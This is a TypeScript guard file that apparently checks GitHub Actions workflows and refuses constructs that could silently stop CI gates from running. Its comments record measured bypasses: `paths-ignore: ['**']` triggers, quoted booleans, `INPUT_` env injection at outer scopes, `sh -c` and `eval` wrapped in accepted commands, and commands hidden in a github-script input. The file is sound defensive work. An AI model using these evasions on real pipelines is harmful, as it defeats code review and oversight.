 * - **it does not run** (`!reached`) — it is on the right of a `||`, so it
 *   executes only when the command in front of it failed. Every green run of
 *   that step skips it, and this file would go on reporting that CI runs it.
 *
 * A named function for the reason {@link unaccounted} gives, and it was needed:
 * with the rule written inline, dropping the `gating` flag on the way into
 * {@link COMMANDS} — reintroducing defect ten's `.map(c => c.text)` exactly —
 * left the tree of 115 that carried it green at 115/115, because no command in
 * `ci.yml` is suppressed and
 * an inline rule over clean input asserts nothing. That measurement is the whole
 * argument for this function existing.
 */
function unenforcedGates(
  commands: readonly WorkflowCommand[],
  gates: readonly CiGate[],
): string[] {
  return commands
    .filter(({ command, gating, reached }) => (!gating || !reached) && gates.some(({ ci }) => command === ci))
    .map(
      ({ file, job, command, gating }) =>
        `${file}:${job}: ${command} (${gating ? 'runs only if the command in front of it failed' : 'its failure cannot fail the job'})`,
    );
}

/**
 * The commands in a verify chain that no {@link VERIFY_INVOCATIONS} entry
 * accepts, reported as `script -> command (why)`.
 *
 * A named function for the reason {@link unaccounted} is one, and the reason is
 * sharper here: `package.json`'s real chain contains only accepted invocations,
 * so a rule written inline would only ever see input that satisfies it.
 *
 * Three answers, kept apart because they want different fixes. *No entry names
 * this program* is defect thirteen. *An entry names the program and not these
 * arguments* is defect eighteen — the totality was one token wide, so
 * `pnpm exec sh -c "…"` and `node -e "eval(…)"` walked through a net built to
 * refuse `sh` and `eval`. *This name binds to a manifest nobody read* is defect
 * nineteen, and it is the only one of the three that is not about the command's
 * own text at all.
 */
function unclassifiedVerifyCommands(chain: readonly VerifyCommand[]): string[] {
  const out: string[] = [];
  for (const { script, command, rebound } of chain) {
    const where = `${script} -> ${command.text}`;
    if (acceptsInvocation(command) === undefined) {
      const known = VERIFY_INVOCATIONS.filter((entry) => entry.program === command.program);
      out.push(
        known.length === 0
          ? `${where} (no entry names the program "${command.program}")`
          : `${where} (arguments outside every shape listed for "${command.program}": ` +
            `${known.map((entry) => entry.shape).join('; ')})`,
      );
      continue;
    }
    if (rebound && command.program === 'pnpm') {
      out.push(`${where} (a "cd" runs in front of it, so which package.json this name binds to is not written here)`);
    }
  }
  return out;
}

function unaccounted(commands: readonly WorkflowCommand[]): string[] {
  return commands
    .filter(
      ({ command }) =>
        !SETUP_COMMANDS.includes(command) && !CI_GATES.some(({ ci }) => command === ci),
    )
    .map(({ file, job, command }) => `${file}:${job}: ${command}`);
}

/**
 * The keys this reader knows how to reason about.
 *
 * An unrecognised key is **refused**, and that is the general form of defect
 * four. Every escape so far was a spelling nobody had listed; a reader that only
 * looks for spellings it knows will always be one spelling behind, while a
 * reader that must classify every key it meets is behind on nothing. GitHub
 * rejects unknown keys too, so the list costs nothing a real workflow needs.
 */
const TOP_LEVEL_KEYS = ['name', 'run-name', 'on', 'env', 'defaults', 'concurrency', 'permissions', 'jobs'];
const JOB_KEYS = [
  'name', 'needs', 'if', 'runs-on', 'permissions', 'environment', 'concurrency',
  'outputs', 'env', 'steps', 'timeout-minutes', 'strategy', 'continue-on-error',
  'uses', 'with', 'secrets',
];
const STEP_KEYS = [
  'id', 'if', 'name', 'uses', 'run', 'working-directory', 'shell', 'with', 'env',
  'continue-on-error', 'timeout-minutes',
];
/** Shells whose `&&`, `||`, `;` and `|` mean what {@link shellCommands} assumes. */
const SPLITTABLE_SHELLS = ['bash', 'sh', 'pwsh', 'powershell', 'cmd'];
/**
 * The `defaults:` shape this reader can reason about. Anything else is refused
 * rather than skipped, for the reason in {@link TOP_LEVEL_KEYS}: a default
 * applies to every step in the file, so a default it cannot read is every step
 * read wrong.
 */
const DEFAULTS_KEYS = ['run'];
const DEFAULTS_RUN_KEYS = ['shell', 'working-directory'];

/**
 * The events this reader knows how to say something about, under `on:`.
 *
 * ### Defect twenty-five: `on:` decides whether any of this runs, and was read by nothing
 *
 * `on` sat in {@link TOP_LEVEL_KEYS} as a key this reader "knows", licensed by
 * the header sentence saying such keys "can only name, remove or reorder work,
 * which is the one-directional weakening above". That sentence is true of a key
 * that reorders work and false of this one: adding `paths-ignore: ['**']` under
 * `push:` and under `pull_request:` — with every gate, `package.json` and
 * `.npmrc` byte-identical — takes every push and every pull request out of CI,
 * and was measured **`181 passed (181)`, exit 0**, twice, on the tree that
 * shipped after round four. The parser handled it silently and correctly:
 * `['**']` is kept as an opaque flow-sequence scalar the way `branches: [main]`
 * already is, so the totality net saw a line it understood and the model dropped
 * it.
 *
 * The invariant really is one-directional, and a reviewer reading a green here
 * really does read it as "CI runs these gates". Both can be true, which is why
 * the answer is not a refusal of the whole key but a pin: the events, and the
 * filters written under each, are compared with {@link CI_TRIGGERS} by *every
 * gate CI has is one it runs on the events this claim assumes*. Widening the
 * triggers is a review; narrowing them to nothing is a red.
 *
 * Read by {@link triggersOf}, and by nothing else. Load-bearing, measured on
 * the tree this comment ships in, twice: making {@link triggersOf} return the
 * pinned list for any `on:` it is handed is `5 failed | 191 passed (196)`, exit
 * 1 — the pin itself plus the four refusal rows, which is the shape of a reader
 * that reports what it was told to expect instead of what it read.
 */
const TRIGGER_EVENTS = ['push', 'pull_request', 'workflow_dispatch'];

/**
 * The keys this reader admits under a trigger. The boundary is *what the filter
 * selects on*.
 *
 * `branches` and `types` select which refs and which pull-request events a run
 * happens for. A path filter selects on **the content of the change**, which is
 * the one shape that can silence CI for the very commit somebody is asking this
 * guard about — and `branches-ignore`/`tags-ignore` are the same key spelled as
 * a complement. Anything not listed here is refused rather than dropped, which
 * is {@link TOP_LEVEL_KEYS}'s rule applied one level down.
 *
 * Read by {@link triggersOf}, and by nothing else. Load-bearing, measured on
 * the tree this comment ships in, twice: making the unknown-filter branch
 * unreachable is `3 failed | 193 passed (196)`, exit 1 — one row per filter
 * spelling, and none of them is a filter `ci.yml` carries, so a rule over the
 * real file alone would assert nothing.
 */
const TRIGGER_FILTER_KEYS = ['branches', 'types'];

/**
 * One line per trigger: the event, followed by each filter written under it.
 *
 * A flat string per event rather than a nested shape, because the only thing
 * done with it is an equality against {@link CI_TRIGGERS} and a string is what
 * makes that assertion's failure readable. A workflow with no `on:` produces an
 * empty list, which the case reports as the drift it is.
 */
function triggersOf(at: (line: number) => string, node: YamlNode | undefined): readonly string[] {
  if (node === undefined) return [];
  const events = mappingOf(node);
  if (events === undefined) {
    throw new Error(
      `${at(node.line)} has an "on:" this reader cannot take apart as a mapping ` +
        'of events. What a workflow runs on decides whether any of its gates ever ' +
        'run, so this reader will not read past it.',
    );
  }

  return events.map(({ key: event, value, line }) => {
    if (!TRIGGER_EVENTS.includes(event)) {
      throw new Error(
        `${at(line)} triggers on "${event}", which this reader has not been told ` +
          'about. Decide whether a run on that event is one this guard is ' +
          'entitled to count, then add it to TRIGGER_EVENTS and to CI_TRIGGERS.',
      );
    }
    const filters = mappingOf(value);
    if (filters === undefined) {
      if (value.kind === 'scalar' && value.value === '') return event;
      throw new Error(
        `${at(line)} writes "${event}:" as something this reader cannot read as a ` +
          'set of filters, so it cannot say which changes CI runs for.',
      );
    }
    return filters
      .map(({ key, value: filter, line: filterLine }) => {
        if (!TRIGGER_FILTER_KEYS.includes(key)) {
          throw new Error(
            `${at(filterLine)} filters "${event}:" on "${key}", which this reader ` +
              'has not been told about. A path filter — "paths", "paths-ignore" — ' +
              'selects on the content of a change rather than on the ref it lands ' +
              'on, which is the one shape that can leave every gate below unrun ' +
              'for the very commit somebody is asking this guard about. Decide ' +
              'what it selects on, then add it to TRIGGER_FILTER_KEYS and write ' +
              'it into CI_TRIGGERS.',
          );
        }
        const text = scalarOf(filter);
        if (text === undefined) {
          throw new Error(
            `${at(filterLine)} has a "${key}:" under "${event}:" that is not one ` +
              'value this reader can resolve.',
          );
        }
        return ` ${key}: ${text}`;
      })
      .reduce((carried, next) => carried + next, event);
  });
}

/**
 * The jobs a `needs:` names, or `undefined` when this reader cannot say.
 *
 * Handles the two spellings that can reach it: one name, and the flow sequence
 * {@link parseWorkflowYaml} keeps as opaque text. The third spelling the runner
 * accepts — a block sequence of plain scalars — never arrives, because this
 * parser refuses it a step earlier (`.github/workflows/probe.yml:2 is at mapping
 * depth but is not a key this reader can read: "first"`), which is a refusal in
 * the safe direction and is asserted in the case below rather than assumed here.
 * A `needs:` this reader misread would be a `needs:` it could not check, and the
 * check is the point: see defect twenty-six in {@link modelOf}.
 *
 * Read by {@link modelOf}, and by *a needs: naming no job takes the whole
 * workflow out of CI — defect twenty-six*. The membership test it feeds is
 * load-bearing, measured on the tree this comment ships in, twice: making that
 * loop always `continue` is `1 failed | 195 passed (196)`, exit 1, at that case
 * — every `needs:` in `ci.yml` resolves, so the rule has to be asked about a
 * document this tree does not contain.
 */
function needsNamesOf(node: YamlNode | undefined): readonly string[] | undefined {
  if (node === undefined) return [];
  const unquote = (name: string): string => name.trim().replace(/^['"]|['"]$/gu, '').trim();
  if (node.kind !== 'scalar') return undefined;
  const value = node.value.trim();
  if (value.startsWith('[')) {
    if (!value.endsWith(']')) return undefined;
    const inner = value.slice(1, -1).trim();
    if (inner === '') return [];
    const names = inner.split(',').map(unquote);
    return names.some((name) => name === '') ? undefined : names;
  }
  return value === '' ? undefined : [unquote(value)];
}

/**
 * Refuse an `env:` key spelled the way GitHub hands an action its inputs, at
 * **any** scope.
 *
 * ### Defect twenty-seven: the fix for twenty-one bound one scope of three
 *
 * {@link refuseEnvOnUses} returns immediately when there is no `uses:` beside
 * the `env:`, so it is only ever handed a step's own block. GitHub merges the
 * workflow-level and job-level `env:` into every step's environment, so the two
 * lines it refuses on a `uses:` step reach the identical action when they are
 * written one or two scopes up. Round four's critic measured it and round five's
 * adversary re-measured it unfixed; reproduced here on the tree that shipped
 * after round four, twice each: `INPUT_REPOSITORY: other-org/not-this-repo` plus
 * `INPUT_REF: probe-branch` appended to `ci.yml`'s existing workflow-level
 * `env:` block was `181 passed (181)` exit 0, and `env: INPUT_RUN_INSTALL:
 * 'recursive'` on the `static` job was `181 passed (181)` exit 0 — while the
 * byte-identical two lines on the `pnpm/action-setup@v4` step inside that job
 * were `no tests`, exit 1.
 *
 * **Neither runtime half is established here**, and the refusal turns on
 * neither: that GitHub merges an outer `env:` into a step's environment, and
 * that it reads `INPUT_<NAME>` there as an action input, are both things this
 * file would have to run the runner to know. No runner was run. The rule this
 * file follows where there is no such fact is a refusal rather than a guess in
 * the direction that happens to be quiet, and the direction is what settles it:
 * refusing costs whoever wants an environment variable of that name a review,
 * and admitting costs a green on a workflow handing an admitted action an input
 * nobody pinned.
 *
 * Read at the three scopes an `env:` can be written in — workflow, job and step
 * — inside {@link modelOf}, and by *refuses an INPUT_ env: at $scope scope —
 * defect twenty-seven*. Load-bearing, measured on the tree this comment ships
 * in, twice: making it a no-op is `4 failed | 192 passed (196)`, exit 1 — the
 * four scope-and-spelling rows of that case; `ci.yml` carries a workflow-level
 * `env:` with no such key, so it is the rows that carry this rule and not the
 * repository.
 */
function refuseActionInputEnv(at: (line: number) => string, node: YamlNode | undefined): void {
  if (node === undefined) return;
  for (const { key, line } of mappingOf(node) ?? []) {
    // Case-blind, because the spelling this recognises is the one GitHub
    // produces from a `with:` key, and what it would do with a name already
    // written some other way is not a fact this reader has. Refusing both costs
    // a review; recognising one costs a green.
    if (!key.toUpperCase().startsWith('INPUT_')) continue;
    throw new Error(
      `${at(line)} sets "${key}" in an "env:" block. A "with:" input reaches an ` +
        'action as the environment variable INPUT_<NAME>, and an "env:" written ' +
        'at workflow or job level is in scope for every step under it, so this ' +
        'may be the key THIRD_PARTY_ACTIONS pins, spelled the other way and ' +
        'written where the pin cannot see it. This reader has not established ' +
        'what the runner makes of it and will not guess in the quiet direction. ' +
        'Write the input under "with:" on the step that needs it.',
    );
  }
}

const mappingOf = (node: YamlNode): readonly YamlEntry[] | undefined =>
  node.kind === 'mapping' ? node.entries : undefined;
const scalarOf = (node: YamlNode | undefined): string | undefined =>
  node !== undefined && node.kind === 'scalar' ? node.value : undefined;
const entry = (entries: readonly YamlEntry[], key: string): YamlNode | undefined =>
  entries.find((candidate) => candidate.key === key)?.value;

/**
 * A scalar **resolved** as YAML 1.2's core schema resolves it, rather than
 * compared against one spelling of it.
 *
 * `true`, `True` and `TRUE` are one value; so are `false`, `False` and `FALSE`.
 * Anything else — YAML 1.1's `yes`/`on`, a GitHub expression, anything at all —
 * is `undefined`, which callers must treat as *"I do not know"* and never as
 * `false`.
 *
 * This resolves a **spelling**, and only {@link yamlBooleanOf} decides which
 * spellings it is allowed to see. That split is defect twenty-four: the sentence
 * above used to carry the clause "or a quoted `"true"` this reader cannot tell
 * from the plain one", and it was false about the code it shipped in — the
 * quotes were stripped by `parseWorkflowYaml` before this function was ever
 * handed the value, so a quoted boolean resolved exactly like a plain one.
 *
 * Defect fourteen is the reason this exists. `modelOf` refused a step only when
 * `scalarOf(entry(step, 'continue-on-error')) === 'true'` — five bytes, one of
 * the three spellings the schema resolves to boolean true. `continue-on-error:
 * True` on the `Typecheck` step of `static` was **141/141 green**, twice, on the
 * tree that shipped after round two, while the byte-identical step spelled
 * `true` was red twice at module load. That is a *textual* question in the
 * refusal this file argues hardest for, one round after the commit message said
 * it had converted `refuseUses` from a textual question to a referential one.
 * One resolver, used by every boolean this reader decides on, is what makes a
 * fourth spelling impossible rather than unlisted.
 *
 * Read by {@link yamlBooleanOf}, and by nothing else.
 */
function yamlBoolean(scalar: string | undefined): boolean | undefined {
  if (scalar === 'true' || scalar === 'True' || scalar === 'TRUE') return true;
  if (scalar === 'false' || scalar === 'False' || scalar === 'FALSE') return false;
  return undefined;
}

/**
 * The boolean a **node** resolves to, or `undefined`.
 *
 * ### Defect twenty-four: the resolver's own doc described a refusal it did not make
 *
 * {@link yamlBoolean}'s comment said a quoted `"true"` was one of the values it
 * returns `undefined` for. Measured on the tree that shipped after round four,
 * twice each: `continue-on-error: 'false'` on the `static` job was
 * `181 passed (181)` exit 0, and `continue-on-error: 'true'` was `no tests`
 * exit 1 with the job-level refusal message — i.e. the quoted spellings resolved
 * *identically* to the plain ones, because `parseWorkflowYaml` strips the quotes
 * in its value reader and the resolver never saw them. The habit is already in
 * `ci.yml`, which writes `DO_NOT_TRACK: '1'` precisely to stop YAML coercing a
 * scalar, so this is a spelling a contributor here reaches for.
 *
 * The unsafe half was `'false'`: it took the allow-branch, and whether GitHub's
 * own parser reads the *string* `false` as a boolean or as a non-empty (truthy)
 * value is exactly the sort of fact this file refuses to guess at — see the
 * header's rule for defect eleven's spellings. So a quoted or block scalar is
 * now `undefined` here, which {@link refuseSuppression} turns into "write a
 * plain boolean". Only YAML's core schema resolves a tag, and it resolves it
 * from the plain form.
 *
 * Read by {@link refuseSuppression}, which is the only place a boolean scalar
 * changes this reader's verdict. Load-bearing, measured on the tree this comment
 * ships in, twice: dropping the `plain` test — which is exactly the reader this
 * file shipped for four rounds — is `1 failed | 195 passed (196)`, exit 1, at
 * *resolves continue-on-error from a plain scalar, not from its text — defect
 * twenty-four*, on `expected false to be undefined`.
 */
function yamlBooleanOf(node: YamlNode | undefined): boolean | undefined {
  if (node === undefined || node.kind !== 'scalar' || !node.plain) return undefined;
  return yamlBoolean(node.value);
}

/**
 * Refuse a `continue-on-error:` that takes something out of the set of things
 * that can fail CI — and refuse a value this reader cannot resolve, because
 * "I could not read it" and "it said false" are not the same answer.
 *
 * Used at **both** levels. Round two's escape was that `modelOf` refused the
 * step-level key by name, argued at length why it must, and listed the
 * identical key in {@link JOB_KEYS} as one this reader "knows" while reading it
 * nowhere: `continue-on-error: true` on the `static` job takes `pnpm
 * typecheck`, `cargo fmt --all --check` and `cargo clippy` out of the set of
 * things that can fail the run, and was **141/141 green**, twice. That is defect
 * nine's own sentence — "listing a key as known is not knowing what it does" —
 * landing on the key next door.
 */
function refuseSuppression(at: string, node: YamlNode | undefined, subject: string): void {
  if (node === undefined) return;
  const resolved = yamlBooleanOf(node);
  if (resolved === undefined) {
    throw new Error(
      `${at} has a "continue-on-error:" this reader cannot resolve to true or ` +
        'false, so it cannot say whether a failure there fails the run. YAML ' +
        'resolves a boolean from a PLAIN scalar spelled true|True|TRUE or ' +
        'false|False|FALSE; a quoted or block scalar is a string, and what the ' +
        'runner does with that string is not a fact this reader has. Write one ' +
        'of those.',
    );
  }
  if (resolved) {
    throw new Error(
      `${at} is ${subject}. It is ` +
        'therefore not a gate, and listing it as one would overstate what CI ' +
        'proves. Say so here before adding it.',
    );
  }
}

/**
 * Turn one workflow's YAML into the jobs, steps and commands the rest of this
 * file asserts over — refusing, by name, anything it cannot account for.
 *
 * `readWorkflows` is the repo-root-relative path of every workflow file this run
 * enumerated, and it exists for exactly one reader: {@link refuseUses}, which
 * may admit a local `uses:` only when the target is a file already in that set.
 * It is a parameter rather than a module constant so that the admission is a
 * fact about *this* run's enumeration rather than about the repository the test
 * process happens to sit in — and so that a case can vary it.
 */
function modelOf(workflow: Workflow, readWorkflows: ReadonlySet<string>): WorkflowModel {
  const where = `.github/workflows/${workflow.file}`;
  const at = (line: number): string => `${where}:${String(line + 1)}`;
  const root = parseWorkflowYaml(workflow.file, workflow.text);

  const top = mappingOf(root);
  if (top === undefined) throw new Error(`${where} is not a mapping at its top level`);
  for (const { key, line } of top) {
    if (!TOP_LEVEL_KEYS.includes(key)) {
      throw new Error(
        `${at(line)} has a top-level key this reader does not know: "${key}". ` +
          'Teach it what that key does before trusting a green run.',
      );
    }
  }

  // Defect twenty-seven. A workflow-level `env:` is merged into every step, so
  // this is the same key `refuseEnvOnUses` refuses beside a `uses:`, written
  // where that function is never handed it.
  refuseActionInputEnv(at, entry(top, 'env'));

  // Defect twenty-five. `on:` was a key this reader "knew" and never read, and
  // it is the key that decides whether any gate below runs at all.
  const triggers = triggersOf(at, entry(top, 'on'));

  // Defect nine. The step-level `shell:` below is refused when this reader
  // cannot split its body — and the identical setting written as a workflow
  // default was listed in TOP_LEVEL_KEYS as a key this reader "knows" and then
  // never read. Measured on the tree carrying the fix for four to six, whose
  // whole suite was 91, twice: a top-level `defaults: run: shell:
  // python` left the file 91/91 green, while the same three lines inside a job
  // are refused, because JOB_KEYS has no `defaults`. Listing a key as known is
  // not knowing what it does; that gap is the whole class this file is about.
  //
  // So `defaults` is taken apart the way jobs and steps are — every key under it
  // must be one this reader can reason about — and the shell it sets becomes the
  // step's shell wherever the step does not set its own.
  const defaultsNode = entry(top, 'defaults');
  let defaultShell: string | undefined;
  if (defaultsNode !== undefined) {
    const defaults = mappingOf(defaultsNode);
    if (defaults === undefined) throw new Error(`${where} has a "defaults:" that is not a mapping`);
    for (const { key, line } of defaults) {
      if (!DEFAULTS_KEYS.includes(key)) {
        throw new Error(
          `${at(line)} has a "defaults:" key this reader does not know: "${key}". ` +
            'A default it cannot reason about applies to every step in the file.',
        );
      }
    }
    const runDefaultsNode = entry(defaults, 'run');
    if (runDefaultsNode !== undefined) {
      const runDefaults = mappingOf(runDefaultsNode);
      if (runDefaults === undefined) throw new Error(`${where} has a "defaults.run:" that is not a mapping`);
      for (const { key, line } of runDefaults) {
        if (!DEFAULTS_RUN_KEYS.includes(key)) {
          throw new Error(
            `${at(line)} has a "defaults.run:" key this reader does not know: ` +
              `"${key}". A default it cannot reason about applies to every "run:" ` +
              'step in the file.',
          );
        }
      }
      defaultShell = scalarOf(entry(runDefaults, 'shell'));
    }
  }

  // Every pinned action this file admitted, so the pin can be checked in both
  // directions. A pin row nothing uses is a hole held open for no reason, and
  // {@link WORKFLOW_FILES} shows what a one-directional pin is worth.
  const actions: string[] = [];

  const jobsNode = entry(top, 'jobs');
  const jobsMap = jobsNode === undefined ? undefined : mappingOf(jobsNode);
  if (jobsMap === undefined) {
    throw new Error(
      `${where} has no "jobs:" mapping this reader can find, so it would ` +
        'contribute no jobs and no gates to checks that are meant to cover every ' +
        'workflow. A file the runner loads and this guard reads as empty is the ' +
        'defect this guard exists to catch.',
    );
  }

  // Defect twenty-six. A `needs:` is checked against this set below: GitHub
  // refuses to load a workflow whose `needs:` names a job that is not in the
  // file, and a file the runner refuses to load runs no gates at all.
  const jobNames = new Set(jobsMap.map(({ key }) => key));

  const jobs = jobsMap.map(({ key: name, value, line }): WorkflowJob => {
    const job = mappingOf(value);
    if (job === undefined) throw new Error(`${at(line)} declares job "${name}" as something other than a mapping`);
    for (const { key, line: keyLine } of job) {
      if (!JOB_KEYS.includes(key)) {
        throw new Error(
          `${at(keyLine)} has a job key this reader does not know: "${key}". ` +
            'A key it cannot reason about may be a set of gates it cannot see.',
        );
      }
    }

    // Defect twenty-six: `needs` was listed in JOB_KEYS as a key this reader
    // "knows" and read nowhere, licensed by the header's "can only name, remove
    // or reorder work". True of `needs` as an ordering key; false of `needs` as
    // a NAME. Renaming this workflow's `static:` job to `static-checks:` and
    // leaving its three `needs: static` lines alone was `181 passed (181)`, exit
    // 0, twice, on the tree that shipped after round four. That GitHub then
    // rejects the whole file rather than running the other jobs is NOT
    // established here — no runner was run — and this refusal does not turn on
    // it: if the runner rejects the file, every gate in it is gone and a green
    // here would be a lie; if it does not, refusing costs a review. An
    // unresolvable name does not reorder work under either answer.
    const needs = needsNamesOf(entry(job, 'needs'));
    if (needs === undefined) {
      throw new Error(
        `${at(line)} declares job "${name}" with a "needs:" this reader cannot ` +
          'resolve to a list of job names, so it cannot say whether the runner ' +
          'would load this file at all.',
      );
    }
    for (const dependency of needs) {
      if (jobNames.has(dependency)) continue;
      throw new Error(
        `${at(line)} declares job "${name}" as needing "${dependency}", and no ` +
          `job in ${where} has that name. What the runner then does with the ` +
          'file is not a fact this reader has, and the safe reading is the one ' +
          'that costs a green: a workflow it will not load runs no gates at all, ' +
          'on any event, while every assertion in this file goes on describing ' +
          'the gates written in it. Fix the name on both sides.',
      );
    }

    // Round two's escape, and the whole of defect fifteen: this key was in
    // JOB_KEYS as one this reader "knows" and was read nowhere, while the
    // identical key on a STEP was refused by name with an argument for why it
    // must be. `continue-on-error: true` on `static` takes all three of its
    // gates out of the set of things that can fail CI and was 141/141 green.
    refuseSuppression(
      at(line),
      entry(job, 'continue-on-error'),
      `a job whose failure cannot fail the workflow run, so no gate in "${name}" can fail it either`,
    );

    // A `uses:` whose value this reader cannot resolve to one string is refused
    // rather than skipped. `scalarOf` returns `undefined` for a mapping or a
    // sequence, and at job level that `undefined` used to be indistinguishable
    // from "this job has no uses:" — so a job with both a non-scalar `uses:` and
    // `steps:` was modelled as an ordinary job with the `uses:` dropped in
    // silence. Silence about a value it could not take apart is the failure mode
    // of every defect in the header.
    const jobUsesNode = entry(job, 'uses');
    const jobUses = scalarOf(jobUsesNode);
    if (jobUsesNode !== undefined && jobUses === undefined) {
      throw new Error(
        `${at(line)} declares job "${name}" with a "uses:" that is not one value ` +
          'this reader can resolve, so it cannot say what that job runs.',
      );
    }
    const jobAction = jobUses === undefined ? undefined : refuseUses(where, line, jobUses, readWorkflows);
    if (jobAction !== undefined) actions.push(jobAction.uses);
    refuseWith(at(line), jobAction, entry(job, 'with'));
    refuseEnvOnUses(at(line), jobUses, entry(job, 'env'));
    refuseActionInputEnv(at, entry(job, 'env'));

    // `secrets:` was the third key listed as known and read nowhere. `secrets:
    // inherit` hands every repository secret to whatever the job calls, and the
    // only thing a job may call here is a workflow this run enumerated — so
    // there is nothing this reader can say about it that is stronger than "I
    // have not been asked to reason about credentials". It refuses rather than
    // consume the line, which is what it did before.
    if (entry(job, 'secrets') !== undefined) {
      throw new Error(
        `${at(line)} declares job "${name}" with a "secrets:", which hands ` +
          'credentials to whatever it calls. This reader does not reason about ' +
          'that and will not consume the key in silence.',
      );
    }

    const stepsNode = entry(job, 'steps');
    if (stepsNode === undefined) {
      if (jobUses !== undefined) return { file: workflow.file, name, runsOn: '', steps: [], commands: [] };
      throw new Error(`${at(line)} declares job "${name}" with neither "steps:" nor "uses:"`);
    }
    if (stepsNode.kind !== 'sequence') {
      throw new Error(`${at(stepsNode.line)} has a "steps:" that is not a sequence this reader can walk`);
    }

    const steps = stepsNode.items.map((item): WorkflowStep => {
      const step = mappingOf(item);
      if (step === undefined) throw new Error(`${at(item.line)} is a step this reader cannot read as a mapping`);
      for (const { key, line: keyLine } of step) {
        if (!STEP_KEYS.includes(key)) {
          throw new Error(
            `${at(keyLine)} has a step key this reader does not know: "${key}". ` +
              'A key it cannot reason about may be a gate it cannot see.',
          );
        }
      }

      const run = scalarOf(entry(step, 'run'));
      const usesNode = entry(step, 'uses');
      const uses = scalarOf(usesNode);
      if (usesNode !== undefined && uses === undefined) {
        throw new Error(
          `${at(item.line)} has a "uses:" that is not one value this reader can ` +
            'resolve, so it cannot say what steps that brings in.',
        );
      }
      if (run !== undefined && uses !== undefined) {
        throw new Error(`${at(item.line)} is a step with both a "run:" and a "uses:", which the runner would reject`);
      }
      if (run === undefined && uses === undefined) {
        throw new Error(`${at(item.line)} is a step with neither a "run:" nor a "uses:", so this reader cannot say what it does`);
      }
      refuseSuppression(
        at(item.line),
        entry(step, 'continue-on-error'),
        'a step whose failure cannot fail the job',
      );
      // The shell this step actually runs under, which is its own `shell:` if it
      // has one and the workflow default otherwise — not merely the one it
      // spells out. That widening is defect nine.
      const ownShell = scalarOf(entry(step, 'shell'));
      const shell = ownShell ?? defaultShell;
      if (shell !== undefined && !SPLITTABLE_SHELLS.includes(shell)) {
        throw new Error(
          `${at(item.line)} runs under "shell: ${shell}"` +
            (ownShell === undefined ? ', set as the workflow default,' : '') +
            ' whose body is not a shell command line. This reader would split it ' +
            'on operators that mean nothing there, so it refuses instead.',
        );
      }
      if (run !== undefined && run.includes('${{')) {
        throw new Error(
          `${at(item.line)} has a "run:" whose text is a GitHub expression, so ` +
            'what it runs is not in this file and is not a command this reader ' +
            'can see. Write the command out.',
        );
      }
      const stepAction = uses === undefined ? undefined : refuseUses(where, item.line, uses, readWorkflows);
      if (stepAction !== undefined) actions.push(stepAction.uses);
      refuseWith(at(item.line), stepAction, entry(step, 'with'));
      refuseEnvOnUses(at(item.line), uses, entry(step, 'env'));
      refuseActionInputEnv(at, entry(step, 'env'));
      return { line: item.line, run };
    });

    return {
      file: workflow.file,
      name,
      runsOn: scalarOf(entry(job, 'runs-on')) ?? '',
      steps,
      commands: steps.flatMap((step) =>
        step.run === undefined ? [] : shellCommands(step.run, `${at(step.line)} run:`),
      ),
    };
  });

  return { file: workflow.file, triggers, jobs, actions };
}

/**
 * Where these bytes land when they are read as a repository path: a `/`-joined
 * path relative to the repository root, or `undefined` when they climb out of
 * it.
 *
 * `.` segments vanish, `..` pops, and a `..` with nothing left to pop is
 * `undefined` rather than a guess. This answers *which file do these bytes
 * name*, which is the question {@link refuseUses} owes and used to answer with
 * a prefix test — defect eleven.
 */
function normaliseUsesPath(target: string): string | undefined {
  const out: string[] = [];
  for (const segment of target.split('/')) {
    if (segment === '' || segment === '.') continue;
    if (segment === '..') {
      if (out.pop() === undefined) return undefined;
      continue;
    }
    out.push(segment);
  }
  return out.join('/');
}

/**
 * One action from another repository that this guard has been told about, and
 * the `with:` keys the workflows here hand it.
 *
 * **The pin is the point**, exactly as it is for {@link WORKFLOW_FILES}. Round
 * two's header said that `owner/repo[/path]@ref` is admitted on purpose and
 * "what {@link isThirdPartyAction} accepts is the size of the remaining hole".
 * That sentence was measurably wrong about the size, and defect sixteen is the
 * measurement: a step
 *
 *     - uses: actions/github-script@v7
 *       with:
 *         script: |
 *           await exec.exec('pnpm', ['probe-unlisted-gate']);
 *           await exec.exec('cargo', ['test', '--workspace', '--locked', '--no-run']);
 *
 * added to `test-ts` was **141/141 green**, twice, on the tree that shipped
 * after round two, while the same two commands written as an ordinary
 * `run: pnpm probe-unlisted-gate` step in the same position was `1 failed | 140
 * passed`, twice. Nothing there was out of reach: the commands are eight lines
 * below the `uses:`, in the file the reader had just finished parsing, under a
 * key it consumes and compares with nothing. The hole was never the acceptance
 * set — it was the acceptance set **times whatever a workflow hands an admitted
 * action under `with:`**, and an open shape test cannot bound the second factor.
 *
 * So both factors are bounded here. The action must be one of these exact
 * strings, and the `with:` keys it may carry are listed with it, so an input
 * that hands an action a program is a review rather than a silent green. Adding
 * an action fails this file, and the fix is to read what it does, decide whether
 * its inputs can carry commands, and write it down — which is the review a new
 * third-party action deserves.
 *
 * What is still out of reach and is meant to be: what these five *do* with the
 * inputs listed. That is a genuinely different question from the one above, and
 * it is bounded by five names instead of by a pattern.
 *
 * The pinned list itself is read in two places: {@link refuseUses}, which looks
 * a target up in it, and *every pinned third-party action is one the workflows
 * really use*, which compares it with what the workflows admitted.
 * {@link refuseWith} does **not** read the list — it reads the `inputs` of the
 * one row {@link refuseUses} hands it. A previous version of this sentence named
 * `refuseWith` and not the test case, which missed in both directions.
 */
interface ThirdPartyAction {
  /** The exact `uses:` string, ref included. */
  readonly uses: string;
  /** The `with:` keys the workflows in this repository hand it. */
  readonly inputs: readonly string[];
}

const THIRD_PARTY_ACTIONS: readonly ThirdPartyAction[] = [
  // Checks the repository out. No inputs here: `fetch-depth` is deliberately
  // left at its default, and `secret-tripwire` says so in a comment.
  { uses: 'actions/checkout@v4', inputs: [] },
  // Installs pnpm itself. `version` is a version number, not a program.
  { uses: 'pnpm/action-setup@v4', inputs: ['version'] },
  // Installs node and wires the pnpm store cache. Both inputs are names.
  { uses: 'actions/setup-node@v4', inputs: ['node-version', 'cache'] },
  // Installs the toolchain named by the ref. No inputs.
  { uses: 'dtolnay/rust-toolchain@stable', inputs: [] },
  // Caches `src-tauri`'s cargo artifacts. `workspaces` is a directory and
  // `prefix-key` is what keeps the Windows job's cache off the Linux jobs'.
  { uses: 'Swatinem/rust-cache@v2', inputs: ['workspaces', 'prefix-key'] },
];

/**
 * Whether these bytes are a reference to an action in *another* repository —
 * `owner/repo[/path…]@ref`.
 *
 * Checked segment by segment, and the `@ref` is required. Every reference to
 * another repository carries one, which is what makes this a question about
 * what the target *is* rather than about how it is spelled:
